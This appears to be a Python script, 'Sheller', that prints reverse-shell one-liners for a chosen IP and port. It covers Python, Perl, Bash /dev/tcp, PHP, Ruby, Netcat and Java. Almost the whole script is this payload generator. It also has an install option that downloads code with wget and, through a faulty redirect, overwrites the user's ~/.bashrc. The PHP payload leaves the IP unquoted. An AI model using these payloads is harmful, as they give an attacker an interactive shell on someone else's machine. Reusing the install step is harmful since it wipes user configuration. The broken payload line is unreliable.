#!/usr/bin/python3
import sys
from os import system
import argparse
import netifaces as ni
parser = argparse.ArgumentParser()
parser.add_argument('-d', help="IP address to connect to", dest="ip", required=False)
parser.add_argument('-i', help="Interface to get IP from", dest="interface", required=False)
parser.add_argument('-p', help="Port to connect to", dest="port", required=False)
parser.add_argument('-alias',dest="alias",help="Installs Sheller on your system with an alias",action="store_true",required=False)
args = parser.parse_args()
def py(ip, port):
    print("[+] Python")
    payload = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (ip, port)
    print(payload,"\n")
def pl(ip, port):
    print("[+] Perl")
    payload = """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (ip, port)
    print(payload,"\n")
def sh(ip, port):
    print("[+] Bash")
    payload = """bash -i >& /dev/tcp/%s/%d 0>&1""" % (ip, port)
    print(payload,"\n")
def php(ip, port):
    print("[+] PHP")
    payload = """php -r '$sock=fsockopen(%s,%d);exec("/bin/sh -i <&3 >&3 2>&3");'""" % (ip, port)
    print(payload,"\n")
def rb(ip, port):
    print("[+] Ruby")
    payload = """ruby -rsocket -e'f=TCPSocket.open({},{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""".format(ip, port)
    print(payload,"\n")
def nc(ip, port):
    print("[+] Netcat")
    payload = "nc -e /bin/sh %s %d" % (ip, port)
    print(payload,"\n")
def java(ip, port):
    print("[+] Java")
    payload = """r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()""" % (ip, port)
    print(payload,"\n")
    
def show_ips():
    print("[+] IPs you may want to use: ")
    system("""ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'""")

if len(sys.argv) <= 1:
    print("[+] No arguments supplied, for help try sheller -h")

def main():
    print("[+] Sheller v.1.1")
    print("[+] Available Interfaces for -i argument: ")
    print(ni.interfaces())
main()

if args.alias:
    print("[+] Creating /usr/share/sheller folder")
    system('mkdir /usr/share/sheller')
    print("[+] Cloning sheller.py into /usr/share/sheller/sheller.py")
    system('wget https://raw.githubusercontent.com/Ak-wa/sheller/master/sheller.py -O /usr/share/sheller/sheller.py')
    print("[+] Setting sheller as alias")
    alias = "alias sheller='python3 /usr/share/sheller/sheller.py'"
    system("%s > ~/.bashrc" % alias)
    print("[+] Done, now you can call sheller everywhere!")
else:
    pass

if args.ip:
    if args.port:
        py(args.ip,int(args.port))
        pl(args.ip,int(args.port))
        sh(args.ip,int(args.port))
        php(args.ip,int(args.port))
        rb(args.ip,int(args.port))
        nc(args.ip,int(args.port))
        java(args.ip,int(args.port))
    else:
        pass
else:
    if args.interface:
        if args.port:
            ip = ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr']
            py(ip,int(args.port))
            pl(ip,int(args.port))
            sh(ip,int(args.port))
            php(ip,int(args.port))
            rb(ip,int(args.port))
            nc(ip,int(args.port))
            java(ip,int(args.port))
